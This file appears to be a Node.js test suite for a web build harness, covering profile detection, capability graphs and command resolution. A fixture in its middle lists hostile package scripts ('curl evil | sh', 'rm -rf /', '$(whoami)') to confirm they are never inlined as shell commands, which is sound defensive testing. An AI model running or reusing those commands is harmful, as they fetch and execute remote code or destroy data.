#!/usr/bin/env node

import assert from 'node:assert/strict'
import {spawnSync} from 'node:child_process'
import {cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync} from 'node:fs'
import {tmpdir} from 'node:os'
import {dirname, join, resolve} from 'node:path'
import {fileURLToPath} from 'node:url'
import {resolveCommand} from '../resolve-commands.mjs'
import {BUILTIN_ADAPTER_IDS, claudeDirectory, loadBuiltinAdapter, loadBuiltinAdapters, validateAdapter, validateDerivedAdapter} from './adapter-lib.mjs'
import {readJson, stableStringify, WebCoreError} from './core-lib.mjs'
import {checkCapabilityDag, compileCapabilityDag} from './dag-lib.mjs'
import {resolveProjectProfile} from './profile-lib.mjs'
import {
  adapterCheckBindings,
  adapterSha256,
  projectProfileSha256,
  resolveAdapterSelection,
  validateLockedExecutionPlan,
  validateLockedProfileProjectState,
  validateLockedProjectProfile,
} from './profile-policy-lib.mjs'

const scriptDirectory = dirname(fileURLToPath(import.meta.url))
const fixtureDirectory = resolve(scriptDirectory, '../../evals/web-core-fixtures')
let assertions = 0
const check = (condition, message) => {
  assertions += 1
  assert.ok(condition, message)
}

for (const name of ['adapter', 'project-profile', 'execution-plan']) {
  const schemaPath = join(claudeDirectory, 'schemas', 'web-core', `${name}.schema.json`)
  check(existsSync(schemaPath), `schema must exist: ${name}`)
  check(readJson(schemaPath).$schema === 'https://json-schema.org/draft/2020-12/schema', `schema must use draft 2020-12: ${name}`)
}

const adapters = loadBuiltinAdapters()
check(adapters.length === 2, 'exactly two built-in profiles are supported')
check(BUILTIN_ADAPTER_IDS.join(',') === 'react-vite-spa,vite-serverless-hybrid', 'built-in profile ids are stable and sorted')
for (const adapter of adapters) {
  // loadBuiltinAdapter가 반환하는 객체는 선언 + 도출이 합쳐진 것이다(2026-08-27). 선언 검증은
  // 도출 필드를 모르므로 선언 부분만 떼어 검사한다.
  const {checks: _derivedChecks, tasks: _derivedTasks, ...declaration} = adapter
  check(validateAdapter(declaration, {expectedId: adapter.id}).length === 0, `${adapter.id} manifest must validate`)
  check(validateDerivedAdapter(adapter).length === 0, `${adapter.id} derived graph must validate`)
  check(adapter.trust.commandPolicy === 'argv-only', `${adapter.id} commands must be argv-only`)
  // 명령은 더 이상 어댑터가 선언하지 않는다 — 실행 시점에 프로젝트 script에서 해석한다.
  // shell 문자열이 섞일 수 있는 표면 자체가 사라졌고, argv 계약은 resolve-commands가 낸다.
  check(adapter.checks.length > 0, `${adapter.id} must derive at least one check`)
  const first = compileCapabilityDag(adapter)
  const second = compileCapabilityDag(adapter)
  check(stableStringify(first) === stableStringify(second), `${adapter.id} DAG compilation must be deterministic`)
  check(first.executionOrder.length === first.nodes.length, `${adapter.id} DAG must contain every selected node once`)
  const positions = new Map(first.executionOrder.map((id, index) => [id, index]))
  check(first.edges.every(edge => positions.get(edge.from) < positions.get(edge.to)), `${adapter.id} DAG must be acyclic and topologically ordered`)
  check(checkCapabilityDag(adapter).taskCount === adapter.tasks.length, `${adapter.id} full graph must be acyclic`)
}

const expected = readJson(join(fixtureDirectory, 'expected.json'))
for (const fixture of expected.profiles) {
  const profile = resolveProjectProfile({
    projectRoot: join(fixtureDirectory, fixture.fixture),
    requested: fixture.requested,
    adapters,
  })
  check(profile.profileId === fixture.expectedProfile, `${fixture.fixture} profile must resolve`)
  check(profile.resolution.source === fixture.expectedSource, `${fixture.fixture} resolution source must match`)
  check(profile.adapter.sha256 === adapterSha256(loadBuiltinAdapter(profile.profileId)), `${fixture.fixture} adapter hash must be locked`)
}
for (const fixture of expected.errors) {
  let caught
  try {
    resolveProjectProfile({
      projectRoot: join(fixtureDirectory, fixture.fixture),
      requested: fixture.requested,
      adapters,
      })
  } catch (error) {
    caught = error
  }
  check(caught instanceof WebCoreError && caught.code === fixture.expectedCode, `${fixture.fixture} must fail with ${fixture.expectedCode}`)
}

const defaultSpaProfile = resolveProjectProfile({
  projectRoot: join(fixtureDirectory, 'projects/react-vite'),
  requested: 'auto',
  adapters,
})
const lockedDefaultSpa = validateLockedProjectProfile(defaultSpaProfile)
const defaultSpaBindings = adapterCheckBindings({
  adapter: lockedDefaultSpa.adapter,
  deploymentTarget: lockedDefaultSpa.selection.target.id,
  capabilities: lockedDefaultSpa.selection.selectedCapabilities,
})
const defaultSpaPlan = compileCapabilityDag(lockedDefaultSpa.adapter, [
  lockedDefaultSpa.selection.releaseTarget,
  ...defaultSpaBindings.map(binding => binding.evidenceCapability),
])
defaultSpaPlan.profileBinding = {
  adapterSha256: defaultSpaProfile.adapter.sha256,
  profileSha256: projectProfileSha256(defaultSpaProfile),
  deploymentProvider: lockedDefaultSpa.selection.provider.id,
  deploymentTarget: lockedDefaultSpa.selection.target.id,
  selectedCapabilities: lockedDefaultSpa.selection.selectedCapabilities,
}
check(validateLockedExecutionPlan(defaultSpaPlan, lockedDefaultSpa).sha256.length === 64, 'bound execution plan must validate and hash deterministically')

const hybridProfile = resolveProjectProfile({
  projectRoot: join(fixtureDirectory, 'projects/react-vite-hybrid'),
  requested: 'auto',
  adapters,
})
check(hybridProfile.deployment.provider === 'vercel', 'hybrid profile must default to the vercel provider')
check(hybridProfile.deployment.target === 'vercel-hybrid', 'hybrid profile must bind the vercel-hybrid target')
check(hybridProfile.deployment.releaseTarget === 'release.vercel-hybrid', 'hybrid profile must bind its release target')
check(hybridProfile.capabilities.includes('serverless-functions'), 'hybrid default capabilities must include serverless functions')
check(!hybridProfile.capabilities.includes('auth'), 'hybrid default profile must not enable authentication without a requirement')
check(hybridProfile.risk.level === 'public', 'hybrid default risk must follow enabled capabilities')
const lockedHybrid = validateLockedProjectProfile(hybridProfile)
const hybridBindings = adapterCheckBindings({
  adapter: lockedHybrid.adapter,
  deploymentTarget: lockedHybrid.selection.target.id,
  capabilities: lockedHybrid.selection.selectedCapabilities,
})
check(hybridBindings.some(binding => binding.id === 'api.guards' && binding.kind === 'security'), 'hybrid profile must require endpoint guard evidence')
check(hybridBindings.some(binding => binding.id === 'api.unit'), 'hybrid profile must require serverless handler unit evidence')
const hybridPlan = compileCapabilityDag(lockedHybrid.adapter, [
  lockedHybrid.selection.releaseTarget,
  ...hybridBindings.map(binding => binding.evidenceCapability),
])
hybridPlan.profileBinding = {
  adapterSha256: hybridProfile.adapter.sha256,
  profileSha256: projectProfileSha256(hybridProfile),
  deploymentProvider: lockedHybrid.selection.provider.id,
  deploymentTarget: lockedHybrid.selection.target.id,
  selectedCapabilities: lockedHybrid.selection.selectedCapabilities,
}
check(validateLockedExecutionPlan(hybridPlan, lockedHybrid).sha256.length === 64, 'hybrid execution plan must validate and hash deterministically')

// 은퇴한 수집 capability는 어댑터 `provides`에 남아 있어도(어댑터 해시 보존) 선택하면 거절한다.
{
  let retired = null
  try {
    resolveAdapterSelection({adapter: loadBuiltinAdapter('react-vite-spa'), capabilities: ['client-routing', 'csr', 'static-build', 'external-ingestion']})
  } catch (error) {
    retired = error
  }
  check(retired instanceof WebCoreError && retired.code === 'CAPABILITY_RETIRED', `retired ingestion capability must be refused: ${retired?.code}`)
}

// 워크스페이스 루트에서 강제 지정한 프로필의 요구 패키지가 멤버에만 있으면 잘못 잡은 루트다 — 잠그지 않는다.
// 멤버가 없는 루트(그린필드 — scaffold 전)는 막지 않는다.
const workspaceRootFixture = mkdtempSync(join(tmpdir(), 'web-harness-workspace-root-'))
try {
  mkdirSync(join(workspaceRootFixture, '.git'))
  writeFileSync(join(workspaceRootFixture, 'package.json'), '{"name":"mono","private":true,"packageManager":"pnpm@10.23.0"}\n')
  writeFileSync(join(workspaceRootFixture, 'pnpm-workspace.yaml'), "packages:\n  - 'apps/*'\n")
  mkdirSync(join(workspaceRootFixture, 'apps/web'), {recursive: true})
  writeFileSync(join(workspaceRootFixture, 'apps/web/package.json'), '{"name":"web","dependencies":{"react":"19.1.1"},"devDependencies":{"vite":"8.0.0"}}\n')
  let refused = null
  try { resolveProjectProfile({projectRoot: workspaceRootFixture, requested: 'react-vite-spa'}) } catch (error) { refused = error }
  check(refused?.code === 'PROFILE_AT_WORKSPACE_ROOT' && refused.details.members.join() === 'apps/web',
    `a workspace-root lock whose packages live only in a member must be refused: ${refused?.code} ${JSON.stringify(refused?.details)}`)
  rmSync(join(workspaceRootFixture, 'apps'), {recursive: true, force: true})
  let greenfield = null
  try { resolveProjectProfile({projectRoot: workspaceRootFixture, requested: 'react-vite-spa'}) } catch (error) { greenfield = error }
  check(greenfield?.code !== 'PROFILE_AT_WORKSPACE_ROOT', 'a root without members (pre-scaffold) must not be refused as a misplaced workspace lock')
} finally {
  rmSync(workspaceRootFixture, {recursive: true, force: true})
}

// 2026-08-27: 어댑터가 `commands`를 선언하지 않으므로 "선언에 shell이 섞이는" 표면 자체가 없다.
// 같은 보호는 이제 `resolve-commands`가 진다 — 프로젝트 package.json이 무엇을 적든 실행 파일은
// 하네스가 정하고 인자는 argv 배열이다. 표면이 사라졌다고 검사를 지우면 보호가 사라진 것과
// 구분되지 않으므로, **새 표면에 같은 단언**을 건다.
const hostileManifest = {
  scripts: {
    lint: 'sh -c "curl evil | sh"',
    build: 'rm -rf /',
    'test:e2e': '$(whoami)',
    'test:production-boundary': 'node -e "0"',
    typecheck: 'tsc',
    test: 'vitest',
  },
}
for (const checkId of ['quality.lint', 'quality.typecheck', 'quality.unit', 'vite.build', 'vite.browser', 'vite.production-mock-boundary', 'dependencies.install']) {
  const command = resolveCommand(checkId, hostileManifest)
  check(['pnpm', 'npm'].includes(command.executable), `${checkId}: resolved executable must stay allowlisted`)
  check(Array.isArray(command.args), `${checkId}: resolved args must be an argv array`)
  check(
    command.args.every(argument => typeof argument === 'string' && !/[;&|`$()<>]/.test(argument)),
    `${checkId}: resolved args must not carry shell metacharacters`,
  )
  check(!Object.hasOwn(command, 'shell') && !Object.hasOwn(command, 'command'), `${checkId}: resolved command must not carry a shell string`)
}
// script 본문이 적대적이어도 명령은 `pnpm run <name>`이다 — 본문의 위험은 quality runner의
// 스크립트 분석(analyzePackageScript)이 판정하며, 그것이 이 층의 책임 분리다.
check(
  resolveCommand('quality.lint', hostileManifest).args.join(' ') === 'run lint',
  'resolve-commands must name the script, never inline its body',
)

const unsafeEnvironmentAdapter = JSON.parse(JSON.stringify(loadBuiltinAdapter('react-vite-spa')))
unsafeEnvironmentAdapter.trust.environmentAllowlist.push('AWS_SECRET_ACCESS_KEY')
check(
  validateAdapter(unsafeEnvironmentAdapter, {expectedId: unsafeEnvironmentAdapter.id}).some(message => message.includes('unsafe key')),
  'adapter environment allowlists must reject secret-bearing host variables',
)

// pnpm 하위 명령 경계도 같은 이유로 새 표면에서 검사한다 — 해석기가 낼 수 있는 pnpm 호출은
// `run <script>`와 `install --frozen-lockfile` 둘뿐이며, 프로젝트 입력이 그것을 바꿀 수 없다.
for (const checkId of ['quality.lint', 'vite.build', 'dependencies.install']) {
  const command = resolveCommand(checkId, {scripts: {lint: 'x', build: 'x', exec: 'x'}})
  const shape = `${command.executable} ${command.args[0]}`
  check(
    ['pnpm run', 'pnpm install', 'npm pack'].includes(shape),
    `${checkId}: resolver must emit only bounded package-manager subcommands, got '${shape}'`,
  )
}

const cyclicAdapter = JSON.parse(JSON.stringify(loadBuiltinAdapter('react-vite-spa')))
cyclicAdapter.tasks = [
  {id: 'cycle.first', phase: 'plan', requires: ['cycle.second-ready'], provides: ['cycle.first-ready'], commandIds: []},
  {id: 'cycle.second', phase: 'plan', requires: ['cycle.first-ready'], provides: ['cycle.second-ready'], commandIds: []},
]
cyclicAdapter.initialCapabilities = []
cyclicAdapter.targetCapabilities = ['cycle.first-ready']
let cycleError
try {
  compileCapabilityDag(cyclicAdapter)
} catch (error) {
  cycleError = error
}
check(cycleError instanceof WebCoreError && cycleError.code === 'DAG_CYCLE', 'cyclic capability graphs must be rejected')

// 은퇴한 Next profile — 요청·잠긴 profile 적재는 「알 수 없음」이 아니라 은퇴로 거절한다.
const retiredCode = run => {
  try {
    run()
  } catch (error) {
    return error instanceof WebCoreError ? error.code : String(error)
  }
  return null
}
check(retiredCode(() => resolveProjectProfile({projectRoot: join(fixtureDirectory, 'projects/unknown'), requested: 'next-app-fullstack', adapters})) === 'ADAPTER_RETIRED', 'retired profile request must fail as ADAPTER_RETIRED')
check(retiredCode(() => loadBuiltinAdapter('next-app-fullstack')) === 'ADAPTER_RETIRED', 'loading a retired adapter (locked profile, plan compile) must fail as ADAPTER_RETIRED')
check(retiredCode(() => resolveProjectProfile({
  projectRoot: join(fixtureDirectory, 'projects/react-vite'),
  requested: 'react-vite-spa',
  deploymentProvider: 'vercel',
  deploymentTarget: 'container-static',
  adapters,
})) === 'DEPLOYMENT_PROVIDER_TARGET_CONFLICT', 'Vercel provider must reject the container target')

const runScript = (name, args = []) => spawnSync(
  process.execPath,
  [join(scriptDirectory, name), ...args],
  {cwd: resolve(claudeDirectory, '..'), encoding: 'utf8'},
)
const validationRun = runScript('validate-adapters.mjs')
check(validationRun.status === 0 && JSON.parse(validationRun.stdout).adapterCount === 2, 'adapter validation CLI must pass')
const cliProfileFixture = mkdtempSync(join(tmpdir(), 'web-harness-profile-cli-'))
cpSync(join(fixtureDirectory, 'projects/next-app'), cliProfileFixture, {recursive: true})
const resolutionRun = runScript('resolve-profile.mjs', [
  '--project-root',
  cliProfileFixture,
  '--requested',
  'auto',
])
check(resolutionRun.status === 1 && JSON.parse(resolutionRun.stderr).error.code === 'ADAPTER_RETIRED', 'profile resolution CLI must report a Next project as a retired profile, not as undetected')
rmSync(cliProfileFixture, {recursive: true, force: true})
const compilationRun = runScript('compile-execution-plan.mjs', ['--profile', 'react-vite-spa'])
check(compilationRun.status === 0 && JSON.parse(compilationRun.stdout).executionOrder.at(-1) === 'release.assemble', 'execution plan CLI must compile a release DAG')
const hybridCompilationRun = runScript('compile-execution-plan.mjs', ['--profile', 'vite-serverless-hybrid'])
check(hybridCompilationRun.status === 0 && JSON.parse(hybridCompilationRun.stdout).executionOrder.at(-1) === 'release.assemble', 'hybrid execution plan CLI must compile a release DAG')
const rejectedRun = runScript('compile-execution-plan.mjs', ['--profile', 'unknown-profile'])
check(rejectedRun.status === 1 && JSON.parse(rejectedRun.stderr).error.code === 'UNKNOWN_PROFILE', 'CLI failures must be structured and deterministic')


// ── 증거 기반 판별 회귀 (2026-08-26) ─────────────────────────────────────────
// 배경(실측): React 19 + Vite 8 SPA인 모노레포 패키지가 PROFILE_NOT_DETECTED로 거부됐다.
// vite가 워크스페이스 루트에 선언돼 있어(호이스팅) 패키지 package.json만 보는 감지기가
// 못 찾았다. 패키지를 루트로 잡으면 vite가, 저장소 루트를 잡으면 react가 안 보인다.
{
  const hoistRoot = mkdtempSync(join(tmpdir(), 'web-harness-evidence-hoist-'))
  try {
    writeFileSync(join(hoistRoot, 'pnpm-workspace.yaml'), "packages:\n  - 'packages/*'\n")
    writeFileSync(join(hoistRoot, 'package.json'), `${JSON.stringify({
      name: 'hoist-monorepo', private: true,
      dependencies: {vite: '^8.0.12'},   // 루트에 선언 — 패키지에는 없다
    })}\n`)
    const appRoot = join(hoistRoot, 'packages/app')
    mkdirSync(join(appRoot, 'src'), {recursive: true})
    writeFileSync(join(appRoot, 'package.json'), `${JSON.stringify({
      name: '@scope/app', private: true, dependencies: {react: '^19.2.0'},
    })}\n`)
    writeFileSync(join(appRoot, 'vite.config.ts'), 'export default {}\n')
    writeFileSync(join(appRoot, 'src/main.tsx'), 'export {}\n')

    const hoisted = resolveProjectProfile({projectRoot: appRoot, requested: 'auto'})
    check(hoisted.profileId === 'react-vite-spa',
      `워크스페이스 루트 선언을 근거로 감지해야 한다 (got ${hoisted.profileId})`)
    check(JSON.stringify(hoisted.resolution ?? hoisted).includes('package:vite@workspace'),
      'evidence에 workspace 근거가 노출되어야 한다')
    check(JSON.stringify(hoisted.resolution ?? hoisted).includes('package:react@declared'),
      'evidence에 declared 근거가 노출되어야 한다')

    // forbidden도 workspace를 본다(리뷰 F3) — 루트로 호이스트해 경계를 우회할 수 없다.
    writeFileSync(join(hoistRoot, 'package.json'), `${JSON.stringify({
      name: 'hoist-monorepo', private: true,
      dependencies: {vite: '^8.0.12', next: '^15.0.0'},
    })}\n`)
    let blocked = false
    try {
      resolveProjectProfile({projectRoot: appRoot, requested: 'auto'})
    } catch (error) {
      blocked = error.code !== undefined
    }
    check(blocked, '워크스페이스 루트의 forbidden 패키지도 경계로 작동해야 한다')
  } finally {
    rmSync(hoistRoot, {recursive: true, force: true})
  }
}

// 기각된 설계 고정 — lockfile 근거는 **채택의 증거가 아니다**(적대 리뷰 2026-08-26).
// webpack/CRA React 앱이 vitest를 쓰면 vite가 lockfile에 전이로 들어온다. 이때 감지되면
// 지원 경계 밖 형태가 조용히 매칭되는 것이므로, 거부가 정답이다.
{
  const lockOnlyRoot = mkdtempSync(join(tmpdir(), 'web-harness-lock-only-'))
  try {
    mkdirSync(join(lockOnlyRoot, 'src'), {recursive: true})
    writeFileSync(join(lockOnlyRoot, 'package.json'), `${JSON.stringify({
      name: 'webpack-react-app', private: true,
      dependencies: {react: '^19.2.0'},
      devDependencies: {webpack: '^5.0.0', vitest: '^3.0.0'},   // vite 직접 선언 없음
    })}\n`)
    writeFileSync(join(lockOnlyRoot, 'pnpm-lock.yaml'),
      'packages:\n  vite@8.0.12:\n    resolution: {integrity: sha512-x}\n' +
      '  vitest@3.0.0:\n    resolution: {integrity: sha512-y}\n')
    writeFileSync(join(lockOnlyRoot, 'src/main.tsx'), 'export {}\n')
    let rejected = false
    try {
      resolveProjectProfile({projectRoot: lockOnlyRoot, requested: 'auto'})
    } catch (error) {
      rejected = error.code === 'PROFILE_NOT_DETECTED'
    }
    check(rejected,
      'lockfile 전이 등재만으로는 감지되면 안 된다 — 설치 증거는 채택 증거가 아니다')
  } finally {
    rmSync(lockOnlyRoot, {recursive: true, force: true})
  }
}

process.stdout.write(stableStringify({ok: true, assertions, profiles: BUILTIN_ADAPTER_IDS}))
